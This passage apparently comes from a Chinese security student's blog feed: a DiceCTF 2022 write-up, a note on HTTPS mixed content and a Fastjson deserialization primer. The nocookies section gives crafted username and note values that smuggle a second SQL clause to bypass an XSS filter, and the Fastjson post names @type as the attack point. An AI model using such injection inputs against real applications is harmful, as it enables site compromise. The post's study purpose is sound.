    note<span class="token punctuation">:</span> note<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/[&lt;>]/g</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    mode<span class="token punctuation">,</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>而note是这样子插入数据库的，这个防御保证了note的内容不能有尖括号，防御XSS，但这里有一个问题，prepare那里没有过滤冒号，而替换是一轮一轮转的，可控的点有username note和mode三项。如果令username为<code>:note)--</code>，而note为<code>&#39;1&#39;, :mode, 1, 0</code>，最后在mode处输入XSS的payload，几轮替换下来就会发生如下情形</p>
<pre class=" language-SQL"><code class="language-SQL">INSERT INTO notes VALUES (:id, :username, :note, :mode, 0)
INSERT INTO notes VALUES (:id, :note)--, :note, :mode, 0)
INSERT INTO notes VALUES (:id, '1', :mode, 1, 0)--, '1', :mode, 1, 0 :mode, 0)
INSERT INTO notes VALUES (:id, '1', payload, 1, 0)
</code></pre>
<p>即可绕过限制引入尖括号，在plaintext情况下实现XSS，并利用RegExp.input完成利用</p>
<p>看的这篇wp<br><a href="https://blog.bawolff.net/2022/02/write-up-for-dicectf-2022-nocookies.html">Write up for DiceCTF 2022: nocookies</a></p>
<h2 id="carrot"><a href="#carrot" class="headerlink" title="carrot"></a>carrot</h2><p>看起来很像xs leak的一个题</p>
<pre class=" language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/tasks'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">tasks</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">'username'</span> <span class="token operator">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>

    tasks <span class="token operator">=</span> db<span class="token punctuation">.</span>get<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'tasks'</span><span class="token punctuation">]</span>

    <span class="token keyword">if</span> <span class="token string">'search'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>args<span class="token punctuation">:</span>
        search <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">[</span><span class="token string">'search'</span><span class="token punctuation">]</span>
        tasks <span class="token operator">=</span> list<span class="token punctuation">(</span>filter<span class="token punctuation">(</span><span class="token keyword">lambda</span> task<span class="token punctuation">:</span> search <span class="token keyword">in</span> task<span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> tasks<span class="token punctuation">)</span><span class="token punctuation">)</span>

    tasks <span class="token operator">=</span> list<span class="token punctuation">(</span>sorted<span class="token punctuation">(</span>tasks<span class="token punctuation">,</span> key<span class="token operator">=</span><span class="token keyword">lambda</span> task<span class="token punctuation">:</span> <span class="token operator">-</span>task<span class="token punctuation">[</span><span class="token string">'priority'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'tasks.html'</span><span class="token punctuation">,</span> tasks<span class="token operator">=</span>tasks<span class="token punctuation">)</span>
</code></pre>
<p>但是完全找不到leak的点，search处看起来就像leak，但这里刚好一无所有，其他的没法leak的点却各种应答不同状态码。本来想着能不能想办法把环境弄炸返回不同状态码，比如SQL注入，但这里是先查询在for x in x匹配的，输入没有查库的环节，并且for in这个语句也不支持正则，redos什么的也没机会</p>
<p>太难了吧，我太垃圾了吧</p>
<p>没有wp。躺平躺平</p>
<p>大半个月过去了还是没有wp，躺了。不过这里看到了一个很强的师傅的博客，记录了可能的做法。说实话这个xs leak的要求有点高了</p>
<p>然后这篇wp提到还有一个misc题，难度也很大。知识点很新颖，顺便一起学习一下。对node的各种玄幻特性不甚了解<br>膜一下<br><a href="https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/">我從 DiceCTF 2022 中學到的各種 JS 與前端冷知識</a></p>
<h3 id="undefined"><a href="#undefined" class="headerlink" title="undefined"></a>undefined</h3><p>这个题就是把一堆属性全都赋值成了undefined之后再给一个eval，放在misc分类里导致我根本就没看到这个题</p>
<p>还是简单记录一下看到的wp和学到的东西，这个题的一个解法是直接使用<code>import(&quot;&quot;)</code>而不是<code>import &#39;&#39;</code>。。。这我真不知道还有区别，以及我一直都是用的前者。。。</p>
<p>然后是第二个解，比较高级，提到了node实际上将最外层的语句也打包成了一个函数（是不是变相解释了为什么不能在最外层用await？）<br><a href="https://stackoverflow.com/questions/28955047/why-does-a-module-level-return-statement-work-in-node-js/28955050#28955050">Why does a module level return statement work in Node.js?</a></p>
<p>然后可以通过argument.callee.caller等方式访问函数进行绕过</p>
<p>在解释node是如何打包函数的时候，看到了这么段代码。</p>
<pre class=" language-javascript"><code class="language-javascript">NativeModule<span class="token punctuation">.</span>wrap <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>script<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> NativeModule<span class="token punctuation">.</span>wrapper<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> script <span class="token operator">+</span> NativeModule<span class="token punctuation">.</span>wrapper<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

NativeModule<span class="token punctuation">.</span>wrapper <span class="token operator">=</span> <span class="token punctuation">[</span>
  <span class="token string">'(function (exports, require, module, __filename, __dirname) { '</span><span class="token punctuation">,</span>
  <span class="token string">'\n});'</span>
<span class="token punctuation">]</span><span class="token punctuation">;</span>
</code></pre>
<p>可以通过<code>arguments</code>访问到函数的参数列表，那么我直接写一个<code>console.log(arguments)</code>，就能获取到这里的exports,require等一系列对象，非常成功<br>但是就从这个代码片段来看，这个函数的构造是简单的拼接，你要这么直接拼接我可就来劲了，马上写个垃圾trytry</p>
<pre><code>console.log(111);
return;
&#125;

&#123; console.log(222);
</code></pre>
<p>理论上也能完整的拼出来一个代码，实际上却被发现了，显然不会犯这么低级的错误。可以根据报错去GitHub翻源码简单看看</p>
<pre><code>SyntaxError: Unexpected token &#39;&#125;&#39;
    at Object.compileFunction (node:vm:352:18)
    at wrapSafe (node:internal/modules/cjs/loader:1032:15)
    at Module._compile (node:internal/modules/cjs/loader:1067:27)
    at Object.Module._extensions..js (node:internal/modules/cjs/loader:1155:10)
    at Module.load (node:internal/modules/cjs/loader:981:32)
    at Function.Module._load (node:internal/modules/cjs/loader:822:12)
    at Function.executeUserEntryPoint [as runMain] (node:internal/modules/run_main:77:12)
    at node:internal/main/run_main_module:17:47
</code></pre>
<p><a href="https://github.com/nodejs/node/blob/7e1e56ac783330fef02e27b0f306abe0cfb744ed/lib/vm.js#L308">lib&#x2F;vm.js#compileFunction</a><br>然后就找不到是哪验证的了。。。。太垃圾了，猜是那个<code>_compileFunction</code>，但是找不到这个函数定义在哪<br>最开头有引入的位置</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token punctuation">{</span>
  ContextifyScript<span class="token punctuation">,</span>
  MicrotaskQueue<span class="token punctuation">,</span>
  makeContext<span class="token punctuation">,</span>
  isContext<span class="token punctuation">:</span> _isContext<span class="token punctuation">,</span>
  constants<span class="token punctuation">,</span>
  compileFunction<span class="token punctuation">:</span> _compileFunction<span class="token punctuation">,</span>
  measureMemory<span class="token punctuation">:</span> _measureMemory<span class="token punctuation">,</span>
<span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">internalBinding</span><span class="token punctuation">(</span><span class="token string">'contextify'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>这个函数名字感觉可能已经到究极底层C实现环节了吗？不知道怎么搞了，躺了<br>然后这个师傅还有一篇讲js函数的文章，有些东西是值得学习的<br><a href="https://blog.huli.tw/2020/04/18/javascript-function-is-awesome/">覺得 JavaScript function 很有趣的我是不是很奇怪</a></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>部分官方wp（这里面好几个究极题的wp。。。）<br><a href="https://brycec.me/posts/dicectf_2022_writeups">dicectf_2022_writeups</a></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTPS Mixed content</title>
    <url>/HTTPS%20Mixed%20content.html</url>
    <content><![CDATA[<h1 id="HTTPS-Mixed-content"><a href="#HTTPS-Mixed-content" class="headerlink" title="HTTPS Mixed content"></a>HTTPS Mixed content</h1><p>起因还是最近把博客迁到国内，往常用的Chrome，看自己的Gitpage是有小锁的，心血来潮用Edge试了试自己新注册域名的https，结果居然和我说不安全？让学长用Safari帮忙试了下也显示不安全，就很气，然后进行了一通学习<br>毕竟Chrome作为”世界上最安全的浏览器”，别人报不安全他报安全就应该是很离谱的事情</p>
<h2 id="Mixed-Content"><a href="#Mixed-Content" class="headerlink" title="Mixed Content"></a>Mixed Content</h2><p>查看成因，Edge的警告是证书没问题但是图片可能存在诱骗，后来发现是拉自己QQ头像的那个链接写的是HTTP，而这种在HTTPS中引入HTTP资源的情况就被称为Mixed Content<br>这显然可能引发奇怪的安全问题，如果在HTTPS中引入了HTTP内容，结果这个HTTP内容被中间人攻击或者DNS污染之类的控制了就很致命，在这样的界面上如果还报安全，那就害人了</p>
<h2 id="Chrome对https的提升"><a href="#Chrome对https的提升" class="headerlink" title="Chrome对https的提升"></a>Chrome对https的提升</h2><p>但是Chrome还能对这种情况上一把小锁，就必然是存在对应操作的——也就是所谓的HTTPS upgrade<br>Chrome在80版本后会尝试对在HTTPS中请求的HTTP资源进行一次提升，以HTTPS的请求方式去请求这个资源，如果HTTPS请求资源失败就封禁这个资源（原文写的是the source will be blocked)，在81版本后会对图片进行同样的处理，确保了HTTPS请求下的资源全都是HTTPS方式加载的，这样就能保证HTTPS下的安全了，真是太牛逼了<br>不过资源不支持HTTPS就直接加载不到是不是也有点武断<br>f12打开Chrome和edge的控制台查看网络请求，确实我头像的请求方式分别是HTTPS和HTTP（腾讯还是有点靠谱的，头像请求API都支持HTTPS，所以之前一直没有发现这种问题）</p>
<p>而Safari和Edge则会直接使用HTTP请求去加载对应资源，然后不显示HTTPS的安全小锁，是不是突然感觉Chrome的确变得安全了一点？</p>
<h2 id="passive-x2F-display-content-amp-active-content"><a href="#passive-x2F-display-content-amp-active-content" class="headerlink" title="passive&#x2F;display content&amp;active content"></a>passive&#x2F;display content&amp;active content</h2><p>Mixed Content分如上两类，mixed passive&#x2F;display content即为img，video这类的静态资源，就只能展示给用户，如果能被加载顶多就是诱骗用户，或者是中间人攻击可以看哪些图片被请求了，有些图片只会出现在特定页面，从而了解用户正在访问什么页面，经典侧信道攻击，总体而言危害比较低，并且感觉这个侧信道攻击如果真的有中间人的话，HTTPS请求同样会被中间人收到，似乎并不能防范<br>mixed active content就是iframe，js，css，fetch请求这些能操作DOM树的玩意，危害正无穷，不用我多说了吧<br>在Chrome中字体和web workers也被认为是mixed active content<br>Chrome 火狐之类的在加载localhost的文件时无视Mixed content规则<br>详解MDN<br><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content">https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content</a></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.ghacks.net/2020/04/02/chrome-81-mixed-content-images-will-be-upgraded-or-blocked/">https://www.ghacks.net/2020/04/02/chrome-81-mixed-content-images-will-be-upgraded-or-blocked/</a></p>
<p>Mixed content测试站点<br><a href="https://www.bennish.net/mixed-content.html">https://www.bennish.net/mixed-content.html</a><br>这个站里面一万个HTTP加载的数据，Chrome在图片不能被HTTPS upgrade的HTTPS站点也会把小锁变成不安全的感叹号，如果能成功upgrade就还是小锁<br>从HTTPS向HTTP提交表单是被允许的，但是加载都不太行了，音频、脚本、视频、图片、CSS什么的都不行，然后控制台里报一万个Mixed Content的错误和警告<br>Edge和Chrome在这个站点的表现区别就是Edge能加载HTTP的图片，剩下的报Mixed Content错误，也就是Chrome80版本的行为准则<br>（不过80好像今年初就发行了，Edge不是改用Chrome内核了吗，怎么感觉好像就不太行）</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>https</tag>
      </tags>
  </entry>
  <entry>
    <title>Fastjson反序列化简易入门</title>
    <url>/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E6%98%93%E5%85%A5%E9%97%A8.html</url>
    <content><![CDATA[<h1 id="Fastjson反序列化简易入门"><a href="#Fastjson反序列化简易入门" class="headerlink" title="Fastjson反序列化简易入门"></a>Fastjson反序列化简易入门</h1><p>终于放暑假啦哈哈哈，放暑假后差不多先摸了一个星期的鱼，然后再开始学点东西</p>
<p>关于Fastjson网上能查到的东西已经非常非常多了，所以我写的肯定没那群神仙好，简单记录一下自己都在学啥，免得日后忘了</p>
<p>本文代码基本上也是网上抄的</p>
<h2 id="简易环境搭建"><a href="#简易环境搭建" class="headerlink" title="简易环境搭建"></a>简易环境搭建</h2><p>fastjson的使用还挺方便的，简单demo的话添加个依赖然后两三句就能搞定<br>pom.xml</p>
<pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>fastjson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.2.10<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
</code></pre>
<p>随着实验更改版本</p>
<p>代码是抄的文末参考链接的</p>
<p>定义user类，并设置private和public属性，以及部分属性的setter getter<br>User.java</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>z33<span class="token punctuation">.</span>test<span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> String name<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//私有属性，有getter、setter方法</span>
    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//私有属性，有getter、setter方法</span>
    <span class="token keyword">private</span> <span class="token keyword">boolean</span> flag<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//私有属性，有is、setter方法</span>
    <span class="token keyword">public</span> String sex<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//公有属性，无getter、setter方法</span>
    <span class="token keyword">private</span> String address<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//私有属性，无getter、setter方法</span>

    <span class="token keyword">public</span> <span class="token function">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"call User default Constructor"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> String <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"call User getName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> name<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"call User setName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"call User getAge"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> age<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"call User setAge"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"call User isFlag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> flag<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setFlag</span><span class="token punctuation">(</span><span class="token keyword">boolean</span> flag<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"call User setFlag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>flag <span class="token operator">=</span> flag<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> String <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token string">"User{"</span> <span class="token operator">+</span>
                <span class="token string">"name='"</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">'\''</span> <span class="token operator">+</span>
                <span class="token string">", age="</span> <span class="token operator">+</span> age <span class="token operator">+</span>
                <span class="token string">", flag="</span> <span class="token operator">+</span> flag <span class="token operator">+</span>
                <span class="token string">", sex='"</span> <span class="token operator">+</span> sex <span class="token operator">+</span> <span class="token string">'\''</span> <span class="token operator">+</span>
                <span class="token string">", address='"</span> <span class="token operator">+</span> address <span class="token operator">+</span> <span class="token string">'\''</span> <span class="token operator">+</span>
                <span class="token string">'}'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre>
<p>test.java</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>z33<span class="token punctuation">.</span>test<span class="token punctuation">;</span>

<span class="token keyword">import</span> com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>JSON<span class="token punctuation">;</span>


<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">test</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        String serializedStr <span class="token operator">=</span> <span class="token string">"{\"@type\":\"org.z33.test.User\",\"name\":\"z33\",\"age\":20, \"flag\": true,\"sex\":\"boy\",\"address\":\"china\"}"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"serializedStr="</span> <span class="token operator">+</span> serializedStr<span class="token punctuation">)</span><span class="token punctuation">;</span>

        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment" spellcheck="true">//通过parse方法进行反序列化，返回的是一个JSONObject]</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"JSON.parse(serializedStr)："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        Object obj1 <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>serializedStr<span class="token punctuation">)</span><span class="token punctuation">;</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"parse反序列化对象名称:"</span> <span class="token operator">+</span> obj1<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"parse反序列化："</span> <span class="token operator">+</span> obj1<span class="token punctuation">)</span><span class="token punctuation">;</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment" spellcheck="true">//通过parseObject,不指定类，返回的是一个JSONObject</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"JSON.parseObject(serializedStr)："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        Object obj2 <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>serializedStr<span class="token punctuation">)</span><span class="token punctuation">;</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"parseObject反序列化对象名称:"</span> <span class="token operator">+</span> obj2<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"parseObject反序列化:"</span> <span class="token operator">+</span> obj2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment" spellcheck="true">//通过parseObject,指定为object.class</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"JSON.parseObject(serializedStr, Object.class)："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        Object obj3 <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>serializedStr<span class="token punctuation">,</span> Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"parseObject反序列化对象名称:"</span> <span class="token operator">+</span> obj3<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"parseObject反序列化:"</span> <span class="token operator">+</span> obj3<span class="token punctuation">)</span><span class="token punctuation">;</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment" spellcheck="true">//通过parseObject,指定为User.class</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"JSON.parseObject(serializedStr, User.class)："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        Object obj4 <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>serializedStr<span class="token punctuation">,</span> User<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"parseObject反序列化对象名称:"</span> <span class="token operator">+</span> obj4<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"parseObject反序列化:"</span> <span class="token operator">+</span> obj4<span class="token punctuation">)</span><span class="token punctuation">;</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>这里展示了三种主要的反序列化方法<br>调用prase，praseObject不指定类以及指定类</p>
<p>fastjson在传入一个序列化字符串时，除了类自带的基础属性，还可以携带一个名为<code>@type</code>的值，这个值就是fastjson攻击的关键点，在开启了autotype的情况下，fastjson会把输入字符串往@type指定的类上去解析，从而完成进一步的攻击</p>
<p>先来看看执行的结果吧<br>不带@type</p>
<pre><code>serializedStr=&#123;&quot;name&quot;:&quot;z33&quot;,&quot;age&quot;:20, &quot;flag&quot;: true,&quot;sex&quot;:&quot;boy&quot;,&quot;address&quot;:&quot;china&quot;&#125;
-----------------------------------------------


JSON.parse(serializedStr)：
parse反序列化对象名称:com.alibaba.fastjson.JSONObject
parse反序列化：&#123;&quot;flag&quot;:true,&quot;address&quot;:&quot;china&quot;,&quot;sex&quot;:&quot;boy&quot;,&quot;name&quot;:&quot;z33&quot;,&quot;age&quot;:20&#125;
-----------------------------------------------

JSON.parseObject(serializedStr)：
parseObject反序列化对象名称:com.alibaba.fastjson.JSONObject
parseObject反序列化:&#123;&quot;flag&quot;:true,&quot;address&quot;:&quot;china&quot;,&quot;sex&quot;:&quot;boy&quot;,&quot;name&quot;:&quot;z33&quot;,&quot;age&quot;:20&#125;
-----------------------------------------------

JSON.parseObject(serializedStr, Object.class)：
parseObject反序列化对象名称:com.alibaba.fastjson.JSONObject
parseObject反序列化:&#123;&quot;flag&quot;:true,&quot;address&quot;:&quot;china&quot;,&quot;sex&quot;:&quot;boy&quot;,&quot;name&quot;:&quot;z33&quot;,&quot;age&quot;:20&#125;
-----------------------------------------------

JSON.parseObject(serializedStr, User.class)：
call User default Constructor
call User setName
call User setAge
call User setFlag
parseObject反序列化对象名称:org.z33.test.User
parseObject反序列化:User&#123;name=&#39;z33&#39;, age=20, flag=true, sex=&#39;boy&#39;, address=&#39;null&#39;&#125;
-----------------------------------------------
</code></pre>
<p>在未指定@type时，只有最后一个函数<code>JSON.parseObject(serializedStr, User.class)</code>在明确指定了类为User时，反序列化出来的对象为User类，且调用了类的构造函数和setter，其公有属性sex在无setter的情况下成功赋值，而私有属性address在无setter的情况下赋值失败<br>私有属性无setter的情况下，可以在反序列化时加上参数Feature.SupportNonPublicField进行赋值</p>
<p>再来看看增加了@type后的结果</p>
<pre><code>serializedStr=&#123;&quot;@type&quot;:&quot;org.z33.test.User&quot;,&quot;name&quot;:&quot;z33&quot;,&quot;age&quot;:20, &quot;flag&quot;: true,&quot;sex&quot;:&quot;boy&quot;,&quot;address&quot;:&quot;china&quot;&#125;
-----------------------------------------------


JSON.parse(serializedStr)：
call User default Constructor
call User setName
call User setAge
call User setFlag
parse反序列化对象名称:org.z33.test.User
parse反序列化：User&#123;name=&#39;z33&#39;, age=20, flag=true, sex=&#39;boy&#39;, address=&#39;null&#39;&#125;
-----------------------------------------------

JSON.parseObject(serializedStr)：
call User default Constructor
call User setName
call User setAge
call User setFlag
call User getName
call User getAge
call User isFlag
